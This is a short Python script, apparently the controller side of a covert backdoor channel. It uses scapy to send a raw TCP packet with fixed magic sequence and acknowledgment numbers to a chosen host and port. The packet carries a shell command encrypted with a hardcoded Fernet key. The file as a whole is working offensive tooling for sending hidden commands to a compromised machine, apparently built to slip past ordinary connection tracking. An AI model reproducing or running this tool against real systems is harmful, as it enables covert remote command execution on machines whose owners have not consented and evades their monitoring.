#!/usr/bin/python3
from cryptography.fernet import Fernet

from scapy.all import Ether, IP, TCP, send, Raw
from random import randint

import socket
import argparse
import sys
import os

def send_tcp_frame(destination_ip, destination_port, payload, seq, ack, flags):
    ip_packet = IP(dst=destination_ip)
    tcp_frame = TCP(
        dport=destination_port,
        sport=randint(10000,60000),
        seq=seq,
        ack=ack,
        flags=flags,
        options=[("NOP", None)]
    )
    special_packet = ip_packet / tcp_frame / Raw(load=payload)
    send(special_packet, verbose=0)

def encrypt_with_aes_key(key, binary_data):
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(binary_data)
    return encrypted_data

if __name__ == "__main__":
    script_name = sys.argv[0]
    def check_sudo():
        if os.geteuid() != 0:
            print(f"{script_name}: error: You need superuser privileges to run this script.")
            exit(1)
    check_sudo()
    
    # Create the argument parser
    parser = argparse.ArgumentParser(description="Sample script with custom command-line arguments")
    parser.add_argument("--host", type=str, help="Specify the host machine", required=True)
    parser.add_argument("-p", "--port", type=int, help="Specify the port", required=True)
    parser.add_argument("--command", nargs=argparse.REMAINDER, help="The command to execute", required=True)
    args = parser.parse_args()

    key = b"Au_dVY1CKhFgaK4RW1kUPpJm_JqYqV7cOJej5tSFVUk="

    command = ' '.join(args.command)
    
    payload = encrypt_with_aes_key(key, command.encode('utf-8'))
    seq = 1736489045
    ack = 3307312975
    flags = "PA"

    send_tcp_frame(args.host, args.port, payload, seq, ack, flags)
    